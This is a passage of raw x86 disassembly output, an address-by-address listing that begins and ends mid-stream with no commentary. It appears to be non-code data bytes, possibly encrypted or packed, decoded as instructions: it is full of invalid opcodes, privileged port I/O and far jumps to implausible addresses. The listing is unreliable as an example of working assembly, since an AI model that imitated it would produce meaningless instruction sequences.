  405f8b:	mov    ecx,DWORD PTR [edi+0x59c7fa3a]
  405f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f92:	(bad)  
  405f93:	stc    
  405f94:	rcl    BYTE PTR [esi+0xb],1
  405f97:	sub    BYTE PTR [edx],dh
  405f99:	jbe    0x405fe6
  405f9b:	mov    bl,0x71
  405f9d:	stos   BYTE PTR es:[edi],al
  405f9e:	dec    ebx
  405f9f:	leave  
  405fa0:	pop    ebx
  405fa1:	out    0x56,al
  405fa3:	ss mov esp,0xed98381a
  405fa9:	push   ebp
  405faa:	mov    ds:0x715fdf83,eax
  405faf:	pop    ds
  405fb0:	sub    dl,0xc
  405fb3:	stc    
  405fb4:	mov    eax,0xd1a7cb0e
  405fb9:	test   eax,0x7cd1b54a
  405fbe:	inc    esi
  405fbf:	not    DWORD PTR [edx+0x257545c3]
  405fc5:	add    ebx,0x79
  405fc8:	and    edx,DWORD PTR [edx-0x8]
  405fcb:	dec    ebp
  405fcc:	aas    
  405fcd:	cs daa 
  405fcf:	(bad)  
  405fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd1:	inc    esp
  405fd2:	or     BYTE PTR [esi],ah
  405fd4:	or     BYTE PTR [ebx],dl
  405fd6:	out    dx,al
  405fd7:	fcmovu st,st(3)
  405fd9:	jmp    0x23f5e8c9
  405fde:	in     eax,0xd9
  405fe0:	adc    eax,0x6e586690
  405fe5:	sbb    dh,BYTE PTR [eax+0x1f35c51c]
  405feb:	sbb    eax,DWORD PTR [eax-0x46200854]
  405ff1:	push   eax
  405ff2:	std    
  405ff3:	fs jb  0x405fdf
  405ff6:	jmp    0x405ffa
  405ff8:	add    BYTE PTR [eax],al
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	push   ds
  406007:	fisubr WORD PTR [esi+0x78c2898f]
  40600d:	js     0x40605c
  40600f:	jle    0x406089
  406011:	js     0x405fa2
  406013:	mov    bl,0xb5
  406015:	int3   
  406016:	mov    DWORD PTR [esi],ebp
  406018:	and    dh,BYTE PTR [esp+esi*2+0x4df0e369]
  40601f:	icebp  
  406020:	pop    edi
  406021:	ins    BYTE PTR es:[edi],dx
  406022:	and    DWORD PTR [ecx],ecx
  406024:	dec    eax
  406025:	xchg   ebx,eax
  406026:	xchg   edi,eax
  406027:	nop
  406028:	(bad)  
  406029:	and    al,0x4c
  40602b:	shl    ah,cl
  40602d:	push   0xffffffb9
  40602f:	fidivr WORD PTR [edx]
  406031:	test   al,0x1d
  406033:	add    DWORD PTR [esi+ebp*1],edx
  406036:	push   0x1bda2cd7
  40603b:	and    eax,0xe90813bf
  406040:	imul   eax,DWORD PTR [edx-0x6],0x412e069a
  406047:	and    DWORD PTR [edx-0x687fbf9f],0x9eaa265e
  406051:	rol    DWORD PTR [edi-0x59],0xb
  406055:	pusha  
  406056:	int3   
  406057:	bound  esi,QWORD PTR [esi-0x5c]
  40605a:	out    dx,eax
  40605b:	jg     0x406038
  40605d:	inc    eax
  40605e:	jmp    0xd3132349
  406063:	dec    eax
  406064:	inc    ecx
  406065:	push   esi
  406066:	mov    DWORD PTR [ebp+0x601cca2f],esp
  40606c:	int    0x66
  40606e:	pop    esp
  40606f:	adc    BYTE PTR [ebp+0x3280ab64],ah
  406075:	cli    
  406076:	xchg   BYTE PTR [ecx],dl
  406078:	push   ss
  406079:	imul   esi,DWORD PTR [ebp-0x5a],0x7a359b2
  406080:	adc    eax,esi
  406082:	call   0xfb89:0xa4a917fe
  406089:	sahf   
  40608a:	jecxz  0x4060e4
  40608c:	aam    0x45
  40608e:	ret    
  40608f:	push   cs
  406090:	out    0xd0,al
  406092:	ficom  WORD PTR [eax]
  406094:	loopne 0x4060a9
  406096:	cwde   
  406097:	les    ebp,FWORD PTR [esp+edi*4-0x50]
  40609b:	mov    ds:0x3635460d,eax
  4060a0:	ficom  WORD PTR [esi+0x12]
  4060a3:	nop
  4060a4:	or     al,0xc8
  4060a6:	lahf   
  4060a7:	sbb    BYTE PTR [edi+0x56],dh
  4060aa:	sbb    al,0xa0
  4060ac:	jb     0x406120
  4060ae:	out    0xd5,al
  4060b0:	out    dx,eax
  4060b1:	cmp    esp,edx
  4060b3:	bswap  edx
  4060b5:	or     ah,BYTE PTR [esi]
  4060b7:	mov    ?,WORD PTR [eax+0x3d]
  4060ba:	jnp    0x4060b1
  4060bc:	xchg   esp,eax
  4060bd:	sub    BYTE PTR [ecx],0x79
  4060c0:	adc    esi,DWORD PTR [ebx-0x47]
  4060c3:	(bad)  
  4060c4:	jno    0x4060cf
  4060c6:	sub    ch,BYTE PTR [ebx+0x2a]
  4060c9:	in     eax,0xee
  4060cb:	repnz cdq 
  4060cd:	in     eax,0xf1
  4060cf:	mov    esp,0x303f3756
  4060d4:	sub    al,0xf6
  4060d6:	sti    
  4060d7:	adc    eax,0xe203dd3e
  4060dc:	jne    0x40609d
  4060de:	mov    ds:0xab74f000,eax
  4060e3:	imul   esp,DWORD PTR [ecx-0x65],0xffffffae
  4060e7:	imul   ebp,DWORD PTR [ebx+ecx*2+0x59],0x20a57ee4
  4060ef:	dec    edx
  4060f0:	loop   0x406092
  4060f2:	popa   
  4060f3:	sbb    ah,BYTE PTR [ebx+ebp*1]
  4060f6:	mov    cl,0x6d
  4060f8:	sbb    eax,DWORD PTR [edx-0x620b7e03]
  4060fe:	cmp    eax,0x86d70205
  406103:	icebp  
  406104:	mov    cl,BYTE PTR [ebp+0x33]
  406107:	push   edx
  406108:	pop    ecx
  406109:	inc    eax
  40610a:	xchg   esp,eax
  40610b:	in     eax,0xbc
  40610d:	jp     0x406093
  40610f:	mov    ds:0xc3dd095f,eax
  406114:	xor    al,0xb2
  406116:	cmp    BYTE PTR [ecx],al
  406118:	aad    0xe4
  40611a:	mov    edx,0xa3146631
  40611f:	jg     0x40613d
  406121:	xor    al,0xa3
  406123:	xor    BYTE PTR [edx+edx*8+0x5a66b912],dh
  40612a:	fidiv  DWORD PTR [esi+0x54b754a0]
  406130:	stos   DWORD PTR es:[edi],eax
  406131:	xchg   esi,eax
  406132:	add    eax,0x28b04654
  406137:	sbb    DWORD PTR [esi],esi
  406139:	es popf 
  40613b:	fldenv [ebp+0x4a3e7d02]
  406141:	sbb    ebp,0xffffff9f
  406144:	in     al,0x60
  406146:	mov    al,ds:0x88e6b67f
  40614b:	add    al,0x54
  40614d:	(bad)  
  40614e:	pop    eax
  40614f:	mov    ecx,0x5eaeb358
  406154:	test   al,0xa8
  406156:	nop
  406157:	sbb    eax,DWORD PTR [edx]
  406159:	das    
  40615a:	mov    dl,0xd6
  40615c:	mov    BYTE PTR [edi+0x2c],0x6b
  406160:	ret    0x230e
  406163:	leave  
  406164:	jb     0x4060fe
  406166:	ja     0x406177
  406168:	and    eax,0x48044388
  40616d:	or     DWORD PTR [eax+0x35449fa],edi
  406173:	sub    DWORD PTR [edi+0x53],0x83f98767
  40617a:	hlt    
  40617b:	inc    ebp
  40617c:	inc    eax
  40617d:	adc    edi,DWORD PTR [ebp+edx*2-0x6d]
  406181:	in     al,0x76
  406183:	or     al,0x3b
  406185:	xor    bh,BYTE PTR [eax+0x4197e235]
  40618b:	(bad)  
  40618d:	jae    0x4061da
  40618f:	imul   eax
  406191:	clc    
  406192:	inc    esi
  406193:	mov    edi,DWORD PTR [edi+0x14]
  406196:	or     bl,BYTE PTR fs:0xbe98fe55
  40619d:	and    eax,0x1b039a87
  4061a2:	mov    bh,0xcf
  4061a4:	lods   eax,DWORD PTR ds:[esi]
  4061a5:	xor    eax,0x2511e1fb
  4061aa:	call   0x47650f52
  4061af:	sbb    al,0x19
  4061b1:	call   0x36d67779
  4061b6:	pushf  
  4061b7:	cmp    al,0x13
  4061b9:	add    eax,0xb8c6718c
  4061be:	inc    BYTE PTR [ecx+0x574a7796]
  4061c4:	mov    bl,0x64
  4061c6:	sub    DWORD PTR [ecx-0x4],0xdb4b90e9
  4061cd:	test   eax,0x7aaea429
  4061d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061d3:	lea    esi,[edi+0x3d]
  4061d6:	out    0xbf,al
  4061d8:	out    0xb5,al
  4061da:	in     eax,0xf8
  4061dc:	loope  0x406170
  4061de:	pushf  
  4061df:	in     eax,0x91
  4061e1:	add    edi,ecx
  4061e3:	cmp    esi,DWORD PTR [ecx+0x57]
  4061e6:	xor    al,0xad
  4061e8:	push   eax
  4061e9:	or     bh,ch
  4061eb:	dec    ebp
  4061ec:	in     eax,0x48
  4061ee:	jnp    0x406197
  4061f0:	mov    esp,0x5e327f88
  4061f5:	not    BYTE PTR [eax]
  4061f7:	sbb    eax,0x2f8f87b4
  4061fc:	jp     0x4061a9
  4061fe:	jecxz  0x4061d0
  406200:	lods   al,BYTE PTR ds:[esi]
  406201:	fsubr  DWORD PTR [edi-0x219b5e8e]
  406207:	sub    eax,0xd1d63cbe
  40620c:	icebp  
  40620d:	adc    al,0x70
  40620f:	fild   DWORD PTR [edi+edx*2]
  406212:	xor    al,0x7a
  406214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406215:	add    esi,eax
  406217:	mov    ?,WORD PTR [eax-0x5b45812a]
  40621d:	rcr    DWORD PTR [eax+0x19],0xad
  406221:	mov    al,ds:0x63a5029
  406226:	and    al,0x1f
  406228:	ds pop ss
  40622a:	or     DWORD PTR [eax],edx
  40622c:	cmp    eax,0xfaa0af4d
  406231:	icebp  
  406232:	vminss xmm2,xmm7,xmm2
  406236:	fnstsw WORD PTR [eax]
  406238:	add    al,0x6
  40623a:	mov    edi,0x2a289a30
  40623f:	push   ds
  406240:	sub    DWORD PTR [edi-0x23],esp
  406243:	aam    0xf5
  406245:	xchg   DWORD PTR [eax+0x4414815b],esp
  40624b:	ins    DWORD PTR es:[edi],dx
  40624c:	and    eax,DWORD PTR [edx]
  40624e:	and    DWORD PTR [edx+ebp*8+0x5bd12e06],ebp
  406255:	loopne 0x406255
  406257:	and    BYTE PTR [edi+0x320a7fc6],al
  40625d:	into   
  40625e:	hlt    
  40625f:	fiadd  DWORD PTR [edx-0x64]
  406262:	jmp    0x406218
  406264:	int    0x3f
  406266:	popa   
  406267:	push   esi
  406268:	xor    ebx,DWORD PTR [ecx-0x3]
  40626b:	jl     0x406278
  40626d:	mov    ah,0x5d
  40626f:	jmp    0x4062dd
  406271:	ds inc esp
  406273:	jle    0x406265
  406275:	jge    0x4062d0
  406277:	cmp    BYTE PTR [eax-0x3],ah
  40627a:	and    cl,dl
  40627c:	out    dx,al
  40627d:	mov    edx,0x64aec49e
  406282:	mul    DWORD PTR [edi+0x6768833f]
  406288:	jl     0x4062eb
  40628a:	xchg   ecx,eax
  40628b:	xchg   ecx,eax
  40628c:	in     al,0x6b
  40628e:	pop    edx
  40628f:	iret   
  406290:	jg     0x406310
  406292:	xor    DWORD PTR [ecx-0x4a],ebp
  406295:	xor    bh,BYTE PTR [ecx+0x6ec88ade]
  40629b:	mov    al,ds:0xfaf00a75
  4062a0:	mov    edx,0x38a4d9bc
  4062a5:	hlt    
  4062a6:	test   BYTE PTR [esi+0x74c43a75],al
  4062ac:	outs   dx,DWORD PTR ds:[esi]
  4062ad:	aas    
  4062ae:	cwde   
  4062af:	(bad)  
  4062b0:	jnp    0x40631b
  4062b2:	ins    DWORD PTR es:[edi],dx
  4062b3:	adc    esp,DWORD PTR [ebp-0x35]
  4062b6:	(bad)  
  4062b7:	jmp    DWORD PTR [edi]
  4062b9:	mov    edi,DWORD PTR [edi+ecx*2]
  4062bc:	dec    esp
  4062bd:	jg     0x4062f4
  4062bf:	leave  
  4062c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062c1:	add    eax,eax
  4062c3:	(bad)  
  4062c4:	mov    edx,0xd4f75af4
  4062c9:	xor    esp,DWORD PTR [edx+0xf]
  4062cc:	loop   0x4062fc
  4062ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062cf:	(bad)  
  4062d0:	pop    ds
  4062d1:	jo     0x4062ba
  4062d3:	nop
  4062d4:	mov    edx,0xddd8a110
  4062d9:	cwde   
  4062da:	and    DWORD PTR [edx+0x4c],ebp
  4062dd:	xchg   BYTE PTR [ecx+ecx*8-0x5d],ch
  4062e1:	ficom  WORD PTR [edx-0xe080b39]
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x72520c5c
  4062fe:	and    eax,0x7878c7de
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x40631d
  406308:	mov    al,ds:0xaf07db62
  40630d:	ins    BYTE PTR es:[edi],dx
  40630e:	rol    edx,1
  406310:	push   ds
  406311:	or     DWORD PTR [edi],ebp
  406313:	je     0x4062d2
  406315:	(bad)  
  406316:	jnp    0x40635f
  406318:	scas   al,BYTE PTR es:[edi]
  406319:	js     0x40635d
  40631b:	outs   dx,DWORD PTR ds:[esi]
  40631c:	nop
  40631d:	stc    
  40631e:	jmp    0xfaf8:0x8ac3112b
  406325:	add    eax,0x19b56430
  40632a:	jl     0x406332
  40632c:	pop    edx
  40632d:	test   al,0xc6
  40632f:	lods   eax,DWORD PTR ds:[esi]
  406330:	sub    edi,DWORD PTR [eax]
  406332:	push   edx
  406333:	(bad)  
  406334:	loopne 0x406367
  406336:	arpl   WORD PTR [ebx+0x64],si
  406339:	push   ss
  40633a:	sti    
  40633b:	cmp    edi,esp
  40633d:	xor    dh,ch
  40633f:	jmp    0x2d9e:0x2d6e907c
  406346:	sbb    BYTE PTR [ecx-0x3a1e571a],al
  40634c:	(bad)  
  40634d:	mov    ch,BYTE PTR [edx]
  40634f:	push   es
  406350:	add    eax,0x871d6070
  406355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406356:	or     al,0x75
  406358:	pop    esp
  406359:	in     al,dx
  40635a:	dec    ebx
  40635b:	dec    edx
  40635c:	arpl   WORD PTR [ecx-0x4852bdc8],dx
  406362:	sar    BYTE PTR [edx],1
  406364:	xchg   edi,eax
  406365:	jb     0x40636e
  406367:	(bad)  
  406368:	cdq    
  406369:	dec    edx
  40636a:	mov    edi,DWORD PTR [ebp-0x5a6facbc]
  406370:	adc    al,0xb9
  406372:	les    ebx,FWORD PTR [ebx+0x27]
  406375:	cwde   
  406376:	nop
  406377:	mov    al,ds:0x882a24eb
  40637c:	jmp    0x4063bf
  40637e:	sbb    edi,edi
  406380:	inc    esi
  406381:	cld    
  406382:	pop    ss
  406383:	push   esi
  406384:	inc    edx
  406385:	iret   
  406386:	sbb    al,0xf0
  406389:	mov    al,0xd3
  40638b:	inc    ebp
  40638c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40638d:	cli    
  40638e:	inc    ecx
  40638f:	adc    al,0xf4
  406391:	jbe    0x4063e1
  406393:	sub    al,0xc3
  406395:	cld    
  406396:	stc    
  406397:	jns    0x406382
  406399:	jmp    0x3ea33d84
  40639e:	stos   BYTE PTR es:[edi],al
  40639f:	call   0x19d0586a
  4063a4:	sti    
  4063a5:	loop   0x4063ae
  4063a7:	std    
  4063a8:	loop   0x4063dc
  4063aa:	xchg   ecx,eax
  4063ab:	rcl    BYTE PTR [ecx+0x49],cl
  4063ae:	addr16 cld 
  4063b0:	loope  0x4063ed
  4063b2:	(bad)  
  4063b3:	call   0x491f:0x90709486
  4063ba:	outs   dx,BYTE PTR ds:[esi]
  4063bb:	inc    ecx
  4063bc:	jo     0x406369
  4063be:	ficomp DWORD PTR [edi-0x6570757b]
  4063c4:	mov    esi,0x8db724c
  4063c9:	xchg   DWORD PTR [ecx-0x193efdc6],esi
  4063cf:	cwde   
  4063d0:	add    edx,DWORD PTR [esi]
  4063d2:	or     al,0xc9
  4063d4:	mov    bl,0x57
  4063d6:	jg     0x4063af
  4063d8:	fcomi  st,st(4)
  4063da:	outs   dx,DWORD PTR ds:[esi]
  4063db:	pop    ecx
  4063dc:	cld    
  4063dd:	add    edx,DWORD PTR [eax]
  4063df:	shr    edx,0x5
  4063e2:	pop    eax
  4063e3:	(bad)  
  4063e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e5:	cld    
  4063e6:	scas   eax,DWORD PTR es:[edi]
  4063e7:	mov    bl,BYTE PTR [eax-0xd]
  4063ea:	jbe    0x4063fb
  4063ec:	jns    0x4063d7
  4063ee:	and    BYTE PTR [edi-0x3c0f8423],ch
  4063f4:	out    0x3b,eax
  4063f6:	or     DWORD PTR [edx+0x62],ecx
  4063f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fa:	add    BYTE PTR [edx],bh
  4063fc:	mov    WORD PTR [ebx-0x51],cs
  4063ff:	loop   0x4063be
  406401:	push   esp
  406402:	pop    ss
  406403:	xchg   edi,eax
  406404:	out    0x54,eax
  406406:	das    
  406407:	loop   0x4063f7
  406409:	ss std 
  40640b:	mov    ecx,0x3939ae05
  406410:	sub    eax,0xbd509268
  406415:	fstp   TBYTE PTR [esi]
  406417:	sub    al,0x76
  406419:	mov    eax,0x7da400b7
  40641e:	push   esp
  40641f:	inc    ebx
  406420:	out    0x34,eax
  406422:	or     al,0xbc
  406424:	test   DWORD PTR [edx],ebp
  406426:	cld    
  406427:	mov    ecx,ecx
  406429:	enter  0xd912,0x3b
  40642d:	in     al,dx
  40642e:	xchg   ecx,eax
  40642f:	std    
  406430:	push   es
  406431:	or     al,0xb1
  406433:	xchg   ebp,eax
  406434:	jnp    0x406437
  406436:	pop    edi
  406437:	cmp    edx,ebx
  406439:	mov    bh,0x95
  40643b:	lds    edi,FWORD PTR [edi-0x356c33d9]
  406441:	cdq    
  406442:	stos   DWORD PTR es:[edi],eax
  406443:	fsub   st,st(7)
  406445:	rcl    BYTE PTR [ecx],cl
  406447:	sub    BYTE PTR [ebp-0x23785389],cl
  40644d:	mov    al,ds:0x25a7fdc4
  406452:	das    
  406453:	sbb    cl,0x28
  406456:	je     0x4063e3
  406458:	loopne 0x406441
  40645a:	add    al,0xe6
  40645c:	pop    esp
  40645d:	pop    es
  40645e:	in     eax,dx
  40645f:	or     al,0x6b
  406461:	xor    edi,DWORD PTR [ecx]
  406463:	shl    BYTE PTR [edx+0x5ffc8a64],0x3b
  40646a:	in     al,0x79
  40646c:	fld    TBYTE PTR [edx]
  40646e:	sub    eax,0x45db9955
  406473:	or     al,0xea
  406475:	mov    ch,0x9f
  406477:	xchg   esi,eax
  406478:	aas    
  406479:	shl    DWORD PTR [eax],1
  40647b:	out    dx,al
  40647c:	fs xchg esi,eax
  40647e:	jns    0x406420
  406480:	es jp  0x4064bb
  406483:	push   esp
  406484:	ss scas eax,DWORD PTR es:[edi]
  406486:	mov    dl,0x96
  406488:	dec    ebp
  406489:	sbb    BYTE PTR [esi-0x4cc7ebeb],al
  40648f:	and    eax,0x99bfe9d9
  406494:	das    
  406495:	mov    dh,0xe2
  406497:	aaa    
  406498:	test   BYTE PTR [eax+0x6a],0x51
  40649c:	sub    al,0xb9
  40649e:	mov    WORD PTR [ecx+0x9],ds
  4064a1:	sbb    esp,DWORD PTR [eax+0x294c3b54]
  4064a7:	sti    
  4064a8:	mov    eax,eax
  4064aa:	sbb    ecx,DWORD PTR [ecx]
  4064ac:	imul   ebx,ebx,0x4704da46
  4064b2:	mov    esp,0xe922a8df
  4064b7:	inc    ecx
  4064b8:	enter  0x6eaa,0x3a
  4064bc:	stos   DWORD PTR es:[edi],eax
  4064bd:	imul   ebp,DWORD PTR [esi+0x550a476e],0xf444eacb
  4064c7:	lods   al,BYTE PTR ds:[esi]
  4064c8:	es (bad) 
  4064ca:	pop    ss
  4064cb:	add    eax,0xde1573e6
  4064d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d1:	inc    esi
  4064d2:	or     dl,BYTE PTR [esi]
  4064d4:	pop    es
  4064d5:	lock pop es
  4064d7:	fcmovne st,st(7)
  4064d9:	mov    ch,0x23
  4064db:	or     al,0x79
  4064dd:	addr16 or bl,bl
  4064e0:	dec    ecx
  4064e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e2:	pop    esi
  4064e3:	jle    0x40651f
  4064e5:	dec    edi
  4064e6:	daa    
  4064e7:	and    esp,ebx
  4064e9:	cli    
  4064ea:	jo     0x4064ca
  4064ec:	bound  esi,QWORD PTR [ecx-0x44]
  4064ef:	pop    edx
  4064f0:	xchg   ebp,eax
  4064f1:	shl    ah,1
  4064f3:	pop    ecx
  4064f4:	pushf  
  4064f5:	jnp    0x406564
  4064f7:	scas   al,BYTE PTR es:[edi]
  4064f8:	fistp  QWORD PTR [edi+0x5d61ef09]
  4064fe:	sub    eax,0x6c43d884
  406503:	(bad)  
  406505:	push   esp
  406506:	fs fcomi st,st(5)
  406509:	sti    
  40650a:	push   esp
  40650b:	mov    ch,0x3c
  40650d:	ds loope 0x4064b7
  406510:	pop    edi
  406511:	xchg   ebp,eax
  406512:	xchg   ecx,eax
  406513:	pop    es
  406514:	pop    esp
  406515:	mov    DWORD PTR [edi+edi*2+0x4400741b],esi
  40651c:	retf   
  40651d:	test   al,0x22
  40651f:	adc    eax,0x8cdb2e05
  406524:	push   0x57053c1b
  406529:	aaa    
  40652a:	cmp    DWORD PTR [edi],ecx
  40652c:	sub    WORD PTR [eax-0x44cbedbc],bp
  406533:	mov    bl,0xa9
  406535:	addr16 dec esp
  406537:	ins    DWORD PTR es:[edi],dx
  406538:	out    dx,eax
  406539:	add    eax,0xe53da320
  40653e:	outs   dx,BYTE PTR ds:[esi]
  40653f:	lea    esi,[ebx+0x5d2edd90]
  406545:	jo     0x4064d5
  406547:	xchg   DWORD PTR [edi+0x4a7cfad9],esi
  40654d:	and    cl,BYTE PTR [eax]
  40654f:	add    al,0x51
  406551:	es lods eax,DWORD PTR gs:[esi]
  406554:	int3   
  406555:	je     0x406500
  406557:	mov    ecx,0x22a79f54
  40655c:	adc    BYTE PTR [edi+edi*4-0x67],0x76
  406561:	into   
  406562:	sub    DWORD PTR [esi],edi
  406564:	das    
  406565:	stc    
  406566:	icebp  
  406567:	test   eax,0x4f5578c7
  40656c:	pop    ebx
  40656d:	mov    edi,0x174de5b9
  406572:	push   ds
  406573:	repz sub esi,esi
  406576:	cmp    edx,ecx
  406578:	xchg   ebx,eax
  406579:	(bad)  
  40657b:	pusha  
  40657c:	pushf  
  40657d:	lds    ebp,FWORD PTR [ebp+edx*1+0x560bdc76]
  406584:	stc    
  406585:	mov    ds:0xbedbf131,eax
  40658a:	dec    ecx
  40658b:	lea    ebp,es:[ecx]
  40658e:	and    eax,0x6eb1e85
  406593:	jp     0x40652f
  406595:	mov    eax,ds:0x4d051cdb
  40659a:	cmp    eax,0xd01b9c9e
  40659f:	ror    BYTE PTR fs:[ebx+0x6f],cl
  4065a3:	out    0x21,eax
  4065a5:	lods   eax,DWORD PTR ds:[esi]
  4065a6:	jb     0x4065a4
  4065a8:	push   ecx
  4065a9:	sar    DWORD PTR [edx-0x338fa13e],0x3f
  4065b0:	or     BYTE PTR [ecx],cl
  4065b2:	push   esp
  4065b3:	lahf   
  4065b4:	sub    DWORD PTR [bp+di],0x4bfb265
  4065bb:	scas   al,BYTE PTR es:[edi]
  4065bc:	psubsw mm1,QWORD PTR [eax+0x3]
  4065c0:	jnp    0x4065bc
  4065c2:	cmp    eax,0x2546dc9f
  4065c7:	adc    esp,DWORD PTR [edx-0x7239ae00]
  4065cd:	sub    dh,BYTE PTR [eax]
  4065cf:	xchg   DWORD PTR [ebx],ebp
  4065d1:	jbe    0x4065b8
  4065d3:	mov    BYTE PTR [edi-0x476f4f2f],cl
  4065d9:	loopne 0x4065fe
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	xchg   edx,eax
  4065f6:	push   ss
  4065f7:	push   esp
  4065f8:	pop    ebx
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x4065bf
  406602:	pop    ecx
  406603:	imul   BYTE PTR [ebp+0xa]
  406606:	test   BYTE PTR [edi+0x35],al
  406609:	and    eax,0xce5670a8
  40660e:	add    eax,0xde0935a4
  406613:	test   BYTE PTR [eax-0xe5cffb7],bl
  406619:	bound  eax,QWORD PTR [esi+0x1]
  40661c:	lahf   
  40661d:	mov    bl,0x89
  40661f:	cmp    eax,0xfdbd507
  406624:	fist   DWORD PTR gs:[ebx+0x4c]
  406628:	cwde   
  406629:	test   BYTE PTR [esi],cl
  40662b:	loopne 0x4065fb
  40662d:	jge    0x4065c8
  40662f:	xor    eax,DWORD PTR [ebp+0x34]
  406632:	fwait
  406633:	sub    edi,DWORD PTR [ecx+0x34]
  406636:	push   esi
  406637:	jg     0x406653
  406639:	mov    esi,DWORD PTR [ecx]
  40663b:	mov    esi,0x5884217c
  406640:	xor    DWORD PTR [edi-0xcd9b71f],edx
  406646:	inc    ecx
  406647:	mov    DWORD PTR [ecx-0x6a082db],ebx
  40664d:	retf   0x2b71
  406650:	fucomi st,st(0)
  406652:	or     al,0x27
  406654:	mov    edi,DWORD PTR [eax+0x4]
  406657:	mov    eax,ds:0xa612e764
  40665c:	or     cl,al
  40665e:	call   0xb42a:0x6b8eeda9
  406665:	xchg   esi,eax
  406666:	aad    0xd2
  406668:	and    eax,0xdde3fe3c
  40666d:	pop    esp
  40666e:	cwde   
  40666f:	ins    DWORD PTR es:[edi],dx
  406670:	repnz es stc 
  406673:	xor    eax,ebx
  406675:	push   edx
  406676:	mov    esi,0x16f60449
  40667b:	icebp  
  40667c:	shr    eax,cl
  40667e:	out    dx,al
  40667f:	fbld   TBYTE PTR [ecx-0x4fc06b26]
  406685:	loopne 0x406635
  406687:	cld    
  406688:	pop    edi
  406689:	pop    ss
  40668a:	bound  esp,QWORD PTR [esi]
  40668c:	and    eax,0x794787f0
  406691:	jne    0x406640
  406693:	mov    ah,0xf9
  406695:	loope  0x4066c1
  406697:	adc    BYTE PTR [ecx-0x153c27e9],bl
  40669d:	idiv   al
  40669f:	pop    eax
  4066a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066a1:	mov    ebx,0x97ae3559
  4066a6:	lods   eax,DWORD PTR ds:[esi]
  4066a7:	jae    0x406659
  4066a9:	rcr    DWORD PTR [ebx+edi*2],cl
  4066ac:	sbb    edx,DWORD PTR [eax+0x7771c96f]
  4066b2:	or     DWORD PTR [ebx+0x5803b017],edx
  4066b8:	mov    ds:0xf75433f6,al
  4066bd:	cli    
  4066be:	addr16 dec ebp
  4066c0:	xchg   BYTE PTR [ebp-0x1014fad9],bl
  4066c6:	dec    edx
  4066c7:	or     al,0xf4
  4066c9:	ror    BYTE PTR [eax+0x459966ef],0xd1
  4066d0:	lea    esi,[edi+edi*4+0x3cda6576]
  4066d7:	pop    edx
  4066d8:	cdq    
  4066d9:	mov    dh,0xd2
  4066db:	add    bl,BYTE PTR [ebp+0x3bf8718a]
  4066e1:	sub    edi,ebp
  4066e3:	adc    dh,al
  4066e5:	sbb    eax,0x401444b
  4066ea:	fistp  DWORD PTR [ebx-0x564f7f09]
  4066f0:	sbb    dh,BYTE PTR [ebp-0x44]
  4066f3:	pop    eax
  4066f4:	jecxz  0x40671e
  4066f6:	mov    edx,0x32b96aab
  4066fb:	sub    BYTE PTR [ebx-0x6f273129],ah
  406701:	xchg   edx,eax
  406702:	cmp    esp,DWORD PTR [ebp+0xc3a002a]
  406708:	cwde   
  406709:	cli    
  40670a:	mov    edi,0x3f48f91d
  40670f:	mov    eax,0xbd25ecc0
  406714:	xchg   edx,eax
  406715:	xchg   ebp,eax
  406716:	(bad)  
  406717:	mov    edi,0x5cd291b3
  40671c:	jmp    0x3678:0xc5fe42a7
  406723:	push   edx
  406724:	pop    esp
  406725:	sub    al,0xd5
  406727:	popf   
  406728:	pop    ss
  406729:	ds gs dec edi
  40672c:	pop    ds
  40672d:	bnd call DWORD PTR fs:[ebx+ebp*1+0x5026425f]
  406736:	rol    al,1
  406738:	test   BYTE PTR [ebx+0x54],0xd7
  40673c:	jmp    0x6d15eadb
  406741:	test   al,0xff
  406743:	xchg   edi,eax
  406744:	adc    BYTE PTR [ecx],dl
  406746:	push   esi
  406747:	clc    
  406748:	popf   
  406749:	mov    bl,0xa6
  40674b:	jne    0x40679f
  40674d:	xor    BYTE PTR [esi],bl
  40674f:	push   ecx
  406750:	sbb    dl,BYTE PTR [ecx-0x4e372715]
  406756:	ds jl  0x406791
  406759:	nop
  40675a:	add    BYTE PTR [ecx],ch
  40675c:	std    
  40675d:	jno    0x4066e8
  40675f:	mov    bh,0xee
  406761:	cmp    al,0xa5
  406763:	sub    ch,al
  406765:	sub    eax,DWORD PTR [esi-0x5948058d]
  40676b:	lods   al,BYTE PTR ds:[esi]
  40676c:	arpl   WORD PTR [ecx+0x5e95c313],dx
  406772:	mov    DWORD PTR [ebx+0x2c],edx
  406775:	pop    edi
  406776:	call   0xb67d9c6a
  40677b:	jno    0x4067e2
  40677d:	mov    esp,0x9d711907
  406782:	int    0x40
  406784:	shl    BYTE PTR [esi-0x55e135c9],cl
  40678a:	push   0x80a52629
  40678f:	xor    bh,BYTE PTR [ebx-0x17c5a483]
